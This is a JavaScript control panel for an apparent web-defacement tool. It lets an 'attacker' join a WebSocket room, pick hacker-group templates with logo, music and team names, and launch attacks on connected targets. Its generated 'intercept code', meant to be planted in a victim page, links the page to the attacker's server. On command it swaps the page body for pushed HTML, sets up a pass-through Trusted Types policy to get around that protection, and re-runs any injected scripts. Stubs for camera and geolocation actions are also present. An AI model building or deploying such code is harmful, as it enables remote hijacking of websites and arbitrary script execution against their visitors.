// State Management
class PanelController {
    constructor() {
        this.currentState = 'connect';
        this.websocket = null;
        this.targetAvailable = false;
        this.targetId = null;
        this.roomData = {
            roomId: '',
            attackerName: '',
            template: '',
            logo: null,
            music: null,
            message: '',
            teamMembers: []
        };
        
        this.init();
    }

    init() {
        this.bindEvents();
        this.showState('connect');
        this.startMatrixEffect();
        this.loadTemplates();
    }

    // State Management
    showState(stateName) {
        // Hide all states
        document.querySelectorAll('.state').forEach(state => {
            state.classList.remove('active');
        });

        // Show target state
        const targetState = document.getElementById(`${stateName}-state`);
        if (targetState) {
            targetState.classList.add('active');
            this.currentState = stateName;
        }
    }

    // Event Bindings
    bindEvents() {
        // Connect button
        const connectBtn = document.getElementById('connect-btn');
        connectBtn.addEventListener('click', () => this.handleConnect());

        // Room ID input - Enter key support and sanitization
        const roomIdInput = document.getElementById('room-id');
        roomIdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.handleConnect();
            }
        });
        
        // Sanitize room ID input in real-time
        roomIdInput.addEventListener('input', (e) => {
            const sanitized = e.target.value.replace(/[^a-zA-Z0-9]/g, '_');
            if (sanitized !== e.target.value) {
                e.target.value = sanitized;
            }
        });

        // Save button
        const saveBtn = document.getElementById('save-btn');
        saveBtn.addEventListener('click', () => this.handleSave());

        // Disconnect button
        const disconnectBtn = document.getElementById('disconnect-btn');
        disconnectBtn.addEventListener('click', () => this.handleDisconnect());

        // File upload handling
        const logoInput = document.getElementById('logo-upload');
        logoInput.addEventListener('change', (e) => this.handleLogoUpload(e));
        
        const musicInput = document.getElementById('music-upload');
        musicInput.addEventListener('change', (e) => this.handleMusicUpload(e));
        // Copy intercept code button
        const copyCodeBtn = document.getElementById('copy-code-btn');
        copyCodeBtn.addEventListener('click', () => this.handleCopyInterceptCode());

        // Refresh templates button
        const refreshTemplatesBtn = document.getElementById('refresh-templates-btn');
        refreshTemplatesBtn.addEventListener('click', () => this.handleRefreshTemplates());
    }

    // Connect Form Handler
    handleConnect() {
        const roomId = document.getElementById('room-id').value.trim();
        
        if (!roomId) {
            this.showError('Please enter a room ID');
            return;
        }
        
        // Sanitize room ID - only allow letters, numbers, and convert others to underscore
        const sanitizedRoomId = roomId.replace(/[^a-zA-Z0-9]/g, '_');
        
        // Update the input field with sanitized value
        document.getElementById('room-id').value = sanitizedRoomId;
        
        // Save sanitized room ID
        this.roomData.roomId = sanitizedRoomId;
        
        // Show loading state
        this.showLoading('connect-btn', 'CONNECTING...');
        
        // Connect to WebSocket
        this.connectWebSocket(sanitizedRoomId);
    }
    
    // WebSocket Connection
    connectWebSocket(roomId) {
        try {
            // Create WebSocket connection
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/${roomId}`;
            
            this.websocket = new WebSocket(wsUrl);
            
            this.websocket.onopen = () => {
                console.log('WebSocket connected');
                // Send join_attacker event with new payload structure
                const joinPayload = {
                    event: 'join',
                    join_at: 'attacker'
                };
                this.websocket.send(JSON.stringify(joinPayload));
                
                // Connection successful
                this.hideLoading('connect-btn', 'CONNECT');
                this.showState('setup');
                this.addLogEntry('Connected to room: ' + roomId);
                this.showSuccess('Successfully connected to room!');
            };
            
            this.websocket.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    console.log('WebSocket message:', data);
                    
                    // Handle different message types based on new structure
                    if (data.type && data.device_id && data.content) {
                        // This is a Message type (welcome message, etc.)
                        this.addLogEntry(`${data.type.toUpperCase()}: ${data.content}`);
                    } else if (data.event) {
                        // This is a Data type with event structure
                        this.handleWebSocketEvent(data);
                    } else {
                        this.addLogEntry(`Unknown message: ${JSON.stringify(data)}`);
                    }
                } catch (e) {
                    console.log('WebSocket raw message:', event.data);
                    this.addLogEntry(`Raw message: ${event.data}`);
                }
            };
            
            this.websocket.onerror = (error) => {
                console.error('WebSocket error:', error);
                this.hideLoading('connect-btn', 'CONNECT');
                this.showError('Failed to connect to WebSocket');
            };
            
            this.websocket.onclose = () => {
                console.log('WebSocket disconnected');
                this.addLogEntry('WebSocket connection closed');
                this.websocket = null;
            };
            
        } catch (error) {
            console.error('WebSocket connection error:', error);
            this.hideLoading('connect-btn', 'CONNECT');
            this.showError('Failed to establish WebSocket connection');
        }
    }
    
    // Handle WebSocket Events with new Data structure
    handleWebSocketEvent(data) {
        switch (data.event) {
            case 'join':
                this.addLogEntry(`Join event: ${data.join_at} joined`);
                break;
            case 'available':
                this.handleTargetAvailable(data.target_id);
                break;
            case 'attack_success':
                this.handleAttackSuccess(data.target_id);
                break;
            case 'action':
                if (data.action) {
                    this.addLogEntry(`Action received: ${data.action.type}`);
                    this.handleAttackAction(data.action);
                }
                break;
            case 'message':
                if (data.message) {
                    this.addLogEntry(`Message from ${data.message.type}: ${data.message.content}`);
                }
                break;
            default:
                this.addLogEntry(`Unknown event: ${data.event}`);
        }
    }
    
    // Handle Target Available Event
    handleTargetAvailable(targetId) {
        this.targetAvailable = true;
        this.targetId = targetId;
        this.addLogEntry(`🎯 Target connected: ${targetId}`);
        this.showSuccess('Target is now available for attack!');
        this.updateAttackButton();
    }
    
    // Handle Attack Success Event
    handleAttackSuccess(targetId) {
        this.addLogEntry(`✅ ATTACK SUCCESSFUL on target: ${targetId}`);
        this.showSuccess('Attack completed successfully! Target page replaced.');
        
        // Re-enable attack button
        const attackBtn = document.getElementById('copy-code-btn');
        if (attackBtn && this.targetAvailable) {
            attackBtn.disabled = false;
            attackBtn.innerHTML = '<span>🚀 ATTACK!</span><div class="btn-glitch"></div>';
        }
    }
    
    // Update Attack Button State
    updateAttackButton() {
        const copyCodeBtn = document.getElementById('copy-code-btn');
        if (!copyCodeBtn) return;
        
        if (this.targetAvailable && this.currentState === 'listening') {
            // Change to Attack button
            copyCodeBtn.innerHTML = '<span>🚀 ATTACK!</span><div class="btn-glitch"></div>';
            copyCodeBtn.className = 'cyber-btn danger';
            copyCodeBtn.title = 'Launch attack on connected target';
            
            // Remove old event listener and add new one
            copyCodeBtn.replaceWith(copyCodeBtn.cloneNode(true));
            const newAttackBtn = document.getElementById('copy-code-btn');
            newAttackBtn.addEventListener('click', () => this.handleAttack());
        } else {
            // Revert to Copy Intercept Code button
            copyCodeBtn.innerHTML = '<span>📋 COPY INTERCEPT CODE</span><div class="btn-glitch"></div>';
            copyCodeBtn.className = 'cyber-btn';
            copyCodeBtn.title = 'Copy intercept code to clipboard';
            
            // Remove old event listener and add new one
            copyCodeBtn.replaceWith(copyCodeBtn.cloneNode(true));
            const newCopyBtn = document.getElementById('copy-code-btn');
            newCopyBtn.addEventListener('click', () => this.handleCopyInterceptCode());
        }
    }
    
    // Handle Attack Actions
    handleAttackAction(action) {
        switch (action.type) {
            case 'attack':
                this.addLogEntry('🚨 ATTACK INITIATED');
                break;
            case 'open-cam':
                this.addLogEntry('📷 Camera access requested');
                break;
            case 'get-geolocation':
                this.addLogEntry('📍 Geolocation access requested');
                break;
            default:
                this.addLogEntry(`Unknown action: ${action.type}`);
        }
    }
    
    // Send Action to Target
    sendAction(actionType) {
        if (!this.websocket || this.websocket.readyState !== WebSocket.OPEN) {
            this.showError('WebSocket not connected');
            return;
        }
        
        const actionPayload = {
            event: 'action',
            action: {
                type: actionType
            }
        };
        
        this.websocket.send(JSON.stringify(actionPayload));
        this.addLogEntry(`Sent action: ${actionType}`);
    }
    
    // Send Message
    sendMessage(content, deviceId = 'panel') {
        if (!this.websocket || this.websocket.readyState !== WebSocket.OPEN) {
            this.showError('WebSocket not connected');
            return;
        }
        
        const messagePayload = {
            event: 'message',
            message: {
                type: 'attacker',
                device_id: deviceId,
                content: content
            }
        };
        
        this.websocket.send(JSON.stringify(messagePayload));
        this.addLogEntry(`Sent message: ${content}`);
    }

    // Handle Attack Button Click
    handleAttack() {
        if (!this.targetAvailable || !this.targetId) {
            this.showError('No target available for attack');
            return;
        }
        
        if (!this.websocket || this.websocket.readyState !== WebSocket.OPEN) {
            this.showError('WebSocket not connected');
            return;
        }
        
        // Show confirmation dialog
        if (!confirm(`Are you sure you want to attack target ${this.targetId}?`)) {
            return;
        }
        
        // Send attack action
        const attackPayload = {
            event: 'action',
            action: {
                type: 'attack'
            }
        };
        
        this.websocket.send(JSON.stringify(attackPayload));
        this.addLogEntry(`🚨 ATTACK LAUNCHED on target: ${this.targetId}`);
        this.showSuccess('Attack command sent to target!');
        
        // Disable attack button temporarily
        const attackBtn = document.getElementById('copy-code-btn');
        if (attackBtn) {
            attackBtn.disabled = true;
            attackBtn.innerHTML = '<span>⏳ ATTACKING...</span><div class="btn-glitch"></div>';
            
            // Re-enable after 3 seconds
            setTimeout(() => {
                if (attackBtn && this.targetAvailable) {
                    attackBtn.disabled = false;
                    attackBtn.innerHTML = '<span>🚀 ATTACK!</span><div class="btn-glitch"></div>';
                }
            }, 3000);
        }
    }

    // Load Templates from API
    async loadTemplates() {
        try {
            const response = await fetch('/api/templates');
            if (response.ok) {
                const result = await response.json();
                if (result.message === 'success' && result.data) {
                    this.populateTemplateDropdown(result.data);
                    this.addLogEntry('Templates loaded successfully');
                } else {
                    throw new Error('Invalid API response format');
                }
            } else {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
        } catch (error) {
            console.error('Failed to load templates:', error);
            this.addLogEntry('Failed to load templates, using fallback');
            this.showError('Failed to load templates from server');
            // Use fallback templates if API fails
            this.populateTemplateDropdown([
                'anonymous_legion', 'cyber_ghost', 'shadow_strike', 'black_terminal',
                'blood_eagle', 'dark_legion', 'elite_squad', 'phantom_collective',
                'digital_rebels', 'cyber_warriors'
            ]);
        }
    }

    // Populate Template Dropdown
    populateTemplateDropdown(templateKeys) {
        const templateSelect = document.getElementById('template-select');
        
        // Clear existing options except the first one
        templateSelect.innerHTML = '<option value="">Select Template...</option>';
        
        // Add templates from API
        templateKeys.forEach(templateKey => {
            const option = document.createElement('option');
            option.value = templateKey;
            option.textContent = this.getTemplateDisplayName(templateKey);
            templateSelect.appendChild(option);
        });
        
        this.addLogEntry(`Loaded ${templateKeys.length} templates`);
    }

    // Handle Refresh Templates Button
    handleRefreshTemplates() {
        const refreshBtn = document.getElementById('refresh-templates-btn');
        const templateSelect = document.getElementById('template-select');
        
        // Show loading state
        refreshBtn.innerHTML = '⏳';
        refreshBtn.disabled = true;
        templateSelect.innerHTML = '<option value="">Refreshing templates...</option>';
        
        // Reload templates
        this.loadTemplates().finally(() => {
            // Reset button state
            refreshBtn.innerHTML = '🔄';
            refreshBtn.disabled = false;
        });
        
        this.addLogEntry('Refreshing templates...');
    }

    // Setup Form Handler
    handleSave() {
        const attackerName = document.getElementById('attacker-name').value.trim();
        const template = document.getElementById('template-select').value;
        const message = document.getElementById('message').value.trim();
        const teamInput = document.getElementById('team-members').value.trim();

        // Validation
        if (!attackerName) {
            this.showError('Please enter attacker name (required)');
            return;
        }
        
        if (!template) {
            this.showError('Please select a template (required)');
            return;
        }
        
        if (!this.roomData.logo) {
            this.showError('Please upload a logo (required)');
            return;
        }

        if (!message) {
            this.showError('Please enter a message (required)');
            return;
        }

        if (!teamInput) {
            this.showError('Please enter team members (required)');
            return;
        }

        // Process team members
        const teamMembers = teamInput.split(';')
            .map(member => member.trim())
            .filter(member => member.length > 0);

        if (teamMembers.length === 0) {
            this.showError('Please enter at least one team member');
            return;
        }

        // Save data
        this.roomData.attackerName = attackerName;
        this.roomData.template = template;
        this.roomData.message = message;
        this.roomData.teamMembers = teamMembers;

        // Show loading state
        this.showLoading('save-btn', 'SAVING...');

        // Send configuration to API
        this.saveConfiguration();
    }
    
    // Save Configuration to API
    async saveConfiguration() {
        try {
            const configData = {
                attacker_name: this.roomData.attackerName,
                template_key: this.roomData.template,
                logo: this.roomData.logo ? await this.fileToBase64(this.roomData.logo) : undefined,
                music: this.roomData.music ? await this.fileToBase64(this.roomData.music) : undefined,
                message: this.roomData.message,
                teams: this.roomData.teamMembers
            };
            
            const response = await fetch(`/api/config/set/${this.roomData.roomId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(configData)
            });
            
            if (response.ok) {
                const result = await response.json();
                console.log('Configuration saved:', result);
                
                this.hideLoading('save-btn', 'SAVE CONFIGURATION');
                this.showState('listening');
                this.addLogEntry('Configuration saved successfully');
                this.updateListeningState();
                this.showSuccess('Configuration saved successfully!');
            } else {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
        } catch (error) {
            console.error('Failed to save configuration:', error);
            this.hideLoading('save-btn', 'SAVE CONFIGURATION');
            this.showError('Failed to save configuration: ' + error.message);
        }
    }
    
    // Convert File to Base64
    fileToBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onload = () => {
                // Remove data:image/jpeg;base64, prefix
                const base64 = reader.result.split(',')[1];
                resolve(base64);
            };
            reader.onerror = reject;
            reader.readAsDataURL(file);
        });
    }

    // Logo Upload Handler
    handleLogoUpload(event) {
        const file = event.target.files[0];
        const fileNameSpan = document.getElementById('file-name');
        
        if (file) {
            // Validate file type
            if (!file.type.startsWith('image/')) {
                this.showError('Please select an image file');
                event.target.value = '';
                return;
            }

            // Validate file size (exactly 1MB requirement)
            const fileSizeMB = file.size / (1024 * 1024);
            if (fileSizeMB > 1) {
                this.showError('Logo file size must be maximum 1MB. Current size: ' + fileSizeMB.toFixed(2) + 'MB');
                event.target.value = '';
                return;
            }

            this.roomData.logo = file;
            fileNameSpan.textContent = file.name + ' (' + fileSizeMB.toFixed(2) + 'MB)';
            this.addLogEntry(`Logo uploaded: ${file.name} (${fileSizeMB.toFixed(2)}MB)`);
            this.showSuccess('Logo uploaded successfully!');
        } else {
            fileNameSpan.textContent = 'Choose file...';
            this.roomData.logo = null;
        }
    }
    
    // Music Upload Handler
    handleMusicUpload(event) {
        const file = event.target.files[0];
        const fileNameSpan = document.getElementById('music-file-name');
        
        if (file) {
            // Validate file type
            if (!file.type.startsWith('audio/')) {
                this.showError('Please select an audio file');
                event.target.value = '';
                return;
            }

            // Validate file size (max 10MB)
            if (file.size > 10 * 1024 * 1024) {
                this.showError('Music file size must be less than 10MB');
                event.target.value = '';
                return;
            }

            this.roomData.music = file;
            fileNameSpan.textContent = file.name;
            this.addLogEntry(`Music uploaded: ${file.name}`);
        } else {
            fileNameSpan.textContent = 'Choose music file...';
            this.roomData.music = null;
        }
    }
    
    // Copy Intercept Code Handler
    handleCopyInterceptCode() {
        const interceptCode = this.generateInterceptCode();
        
        // Copy to clipboard
        navigator.clipboard.writeText(interceptCode).then(() => {
            this.showSuccess('Intercept code copied to clipboard!');
            this.addLogEntry('Intercept code copied to clipboard');
        }).catch(() => {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = interceptCode;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            this.showSuccess('Intercept code copied to clipboard!');
            this.addLogEntry('Intercept code copied to clipboard');
        });
    }
    
    // Generate Intercept Code
    generateInterceptCode() {
        const baseUrl = window.location.origin;
        const roomId = this.roomData.roomId;
        const template = this.roomData.template;
        
        return `// HEKBAI Intercept Code
// Room: ${roomId}
// Template: ${this.getTemplateDisplayName(template)}
// Attacker: ${this.roomData.attackerName}

const ws = new WebSocket('${baseUrl.replace('http', 'ws')}/${roomId}');

ws.onopen = () => {
    console.log('Connected to HEKBAI room: ${roomId}');
    
    // Join as target
    const joinPayload = {
        event: 'join',
        join_at: 'target'
    };
    ws.send(JSON.stringify(joinPayload));
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    console.log('Intercepted:', data);
    
    // Handle different message types
    if (data.event === 'html_replace' && data.html) {
        console.log('HTML replacement received');
        replacePageHTML(data.html);
    } else if (data.event === 'action' && data.action) {
        console.log('Action received:', data.action.type);
        handleAction(data.action);
    } else if (data.event === 'message' && data.message) {
        console.log('Message from attacker:', data.message.content);
    }
};

function replacePageHTML(htmlContent) {
    console.log('🚨 PAGE HIJACKED - Replacing body content');
    
    try {
        // Extract content from the HTML (remove html, head, body tags if present)
        let bodyContent = htmlContent;
        
        // Simple string-based extraction to avoid regex issues
        const bodyStartTag = htmlContent.indexOf('<body');
        const bodyEndTag = htmlContent.indexOf('</body>');
        
        if (bodyStartTag !== -1 && bodyEndTag !== -1) {
            // Find the end of the opening body tag
            const bodyOpenEnd = htmlContent.indexOf('>', bodyStartTag) + 1;
            // Extract content between body tags
            bodyContent = htmlContent.substring(bodyOpenEnd, bodyEndTag);
        } else {
            // If no body tags, use the content as-is since our templates are already body content
            bodyContent = htmlContent;
        }
        
        // Method 1: Try using innerHTML with TrustedHTML bypass
        try {
            if (window.trustedTypes && window.trustedTypes.createPolicy) {
                const policy = window.trustedTypes.createPolicy('hackPolicy', {
                    createHTML: function(string) { return string; }
                });
                document.body.innerHTML = policy.createHTML(bodyContent);
            } else {
                document.body.innerHTML = bodyContent;
            }
        } catch (e) {
            console.log('innerHTML failed, using DOM manipulation method');
            
            // Method 2: Use DOMParser as fallback
            const parser = new DOMParser();
            const doc = parser.parseFromString('<div>' + bodyContent + '</div>', 'text/html');
            const container = doc.querySelector('div');
            
            // Clear body content
            while (document.body.firstChild) {
                document.body.removeChild(document.body.firstChild);
            }
            
            // Move all children from container to body
            while (container.firstChild) {
                document.body.appendChild(container.firstChild);
            }
        }
        
        // Execute any scripts that might be in the injected content
        const scripts = document.body.querySelectorAll('script');
        scripts.forEach(function(script) {
            const newScript = document.createElement('script');
            if (script.src) {
                newScript.src = script.src;
            } else {
                newScript.textContent = script.textContent;
            }
            document.head.appendChild(newScript);
            script.remove();
        });
        
    } catch (error) {
        console.error('Failed to replace page HTML:', error);
        
        // Fallback method: Simple text replacement
        try {
            document.body.textContent = '';
            const div = document.createElement('div');
            div.innerHTML = htmlContent;
            document.body.appendChild(div);
        } catch (fallbackError) {
            console.error('All methods failed:', fallbackError);
        }
    }
}

function handleAction(action) {
    switch (action.type) {
        case 'attack':
            console.log('🚨 Attack initiated!');
            break;
        case 'open-cam':
            console.log('📷 Camera access requested');
            // Add camera access code here
            break;
        case 'get-geolocation':
            console.log('📍 Geolocation requested');
            // Add geolocation code here
            break;
    }
}

ws.onerror = (error) => {
    console.error('WebSocket error:', error);
};

ws.onclose = () => {
    console.log('WebSocket connection closed');
};`;
    }

    // Update Listening State Display
    updateListeningState() {
        document.getElementById('current-room').textContent = this.roomData.roomId;
        document.getElementById('current-template').textContent = 
            this.getTemplateDisplayName(this.roomData.template);
        document.getElementById('team-size').textContent = this.roomData.teamMembers.length;
        
        // Update attack button state when entering listening mode
        this.updateAttackButton();
    }

    // Helper Methods
    getTemplateDisplayName(template) {
        const templates = {
            'anonymous_legion': 'Anonymous Legion',
            'cyber_ghost': 'Cyber Ghost',
            'shadow_strike': 'Shadow Strike',
            'black_terminal': 'Black Terminal',
            'blood_eagle': 'Blood Eagle',
            'dark_legion': 'Dark Legion',
            'elite_squad': 'Elite Squad',
            'phantom_collective': 'Phantom Collective',
            'digital_rebels': 'Digital Rebels',
            'cyber_warriors': 'Cyber Warriors'
        };
        return templates[template] || template;
    }

    showLoading(buttonId, text) {
        const button = document.getElementById(buttonId);
        const span = button.querySelector('span');
        span.innerHTML = `<div class="loading"></div> ${text}`;
        button.disabled = true;
    }

    hideLoading(buttonId, originalText) {
        const button = document.getElementById(buttonId);
        const span = button.querySelector('span');
        span.textContent = originalText;
        button.disabled = false;
    }

    showError(message) {
        // Create error notification
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-notification';
        errorDiv.textContent = `ERROR: ${message}`;
        errorDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 0, 64, 0.9);
            color: white;
            padding: 15px 20px;
            border-radius: 5px;
            border: 1px solid #ff0040;
            font-family: 'Courier Prime', monospace;
            font-size: 0.9rem;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
        `;

        document.body.appendChild(errorDiv);

        // Auto remove after 3 seconds
        setTimeout(() => {
            errorDiv.style.animation = 'slideOut 0.3s ease-in forwards';
            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.parentNode.removeChild(errorDiv);
                }
            }, 300);
        }, 3000);

        this.addLogEntry(`ERROR: ${message}`);
    }
    
    showSuccess(message) {
        // Create success notification
        const successDiv = document.createElement('div');
        successDiv.className = 'success-notification';
        successDiv.textContent = `SUCCESS: ${message}`;
        successDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 255, 0, 0.9);
            color: black;
            padding: 15px 20px;
            border-radius: 5px;
            border: 1px solid #00ff00;
            font-family: 'Courier Prime', monospace;
            font-size: 0.9rem;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
        `;

        document.body.appendChild(successDiv);

        // Auto remove after 3 seconds
        setTimeout(() => {
            successDiv.style.animation = 'slideOut 0.3s ease-in forwards';
            setTimeout(() => {
                if (successDiv.parentNode) {
                    successDiv.parentNode.removeChild(successDiv);
                }
            }, 300);
        }, 3000);

        this.addLogEntry(`SUCCESS: ${message}`);
    }

    // Disconnect Handler
    handleDisconnect() {
        // Close WebSocket connection
        if (this.websocket) {
            this.websocket.close();
            this.websocket = null;
        }
        
        // Reset target availability
        this.targetAvailable = false;
        this.targetId = null;
        
        this.showState('connect');
        this.addLogEntry('Disconnected from room');
        this.resetForm();
    }

    addLogEntry(message) {
        const logContainer = document.querySelector('.log-container');
        if (!logContainer) return;

        const timestamp = new Date().toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        logEntry.textContent = `[${timestamp}] ${message}`;

        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;

        // Limit log entries to prevent memory issues
        const entries = logContainer.querySelectorAll('.log-entry');
        if (entries.length > 50) {
            entries[0].remove();
        }
    }

    resetForm() {
        // Reset all form fields
        document.getElementById('room-id').value = '';
        document.getElementById('attacker-name').value = '';
        document.getElementById('template-select').value = '';
        document.getElementById('message').value = '';
        document.getElementById('team-members').value = '';
        document.getElementById('logo-upload').value = '';
        document.getElementById('music-upload').value = '';
        document.getElementById('file-name').textContent = 'Choose file...';
        document.getElementById('music-file-name').textContent = 'Choose music file...';

        // Close WebSocket if open
        if (this.websocket) {
            this.websocket.close();
            this.websocket = null;
        }
        
        // Reset room data
        this.roomData = {
            roomId: '',
            attackerName: '',
            template: '',
            logo: null,
            music: null,
            message: '',
            teamMembers: []
        };
    }

    // Matrix Background Effect
    startMatrixEffect() {
        // Add dynamic matrix characters
        const matrixBg = document.querySelector('.matrix-bg');
        
        // Create matrix characters periodically
        setInterval(() => {
            if (Math.random() < 0.1) { // 10% chance every interval
                this.createMatrixChar();
            }
        }, 200);
    }

    createMatrixChar() {
        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
        const char = chars[Math.floor(Math.random() * chars.length)];
        
        const span = document.createElement('span');
        span.textContent = char;
        span.style.cssText = `
            position: fixed;
            color: #00ff00;
            font-family: 'Courier Prime', monospace;
            font-size: ${Math.random() * 10 + 10}px;
            left: ${Math.random() * 100}vw;
            top: -20px;
            opacity: ${Math.random() * 0.5 + 0.3};
            pointer-events: none;
            z-index: -1;
            animation: matrixFall ${Math.random() * 3 + 2}s linear forwards;
        `;

        document.body.appendChild(span);

        // Remove after animation
        setTimeout(() => {
            if (span.parentNode) {
                span.parentNode.removeChild(span);
            }
        }, 5000);
    }
}

// CSS Animations for notifications and matrix effect
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
    
    @keyframes matrixFall {
        to { 
            transform: translateY(100vh); 
            opacity: 0; 
        }
    }
`;
document.head.appendChild(style);

// Initialize the panel controller when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.panelController = new PanelController();
});

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    // Escape key to go back to previous state
    if (e.key === 'Escape') {
        const controller = window.panelController;
        if (controller) {
            if (controller.currentState === 'setup') {
                controller.showState('connect');
            } else if (controller.currentState === 'listening') {
                controller.showState('setup');
            }
        }
    }
});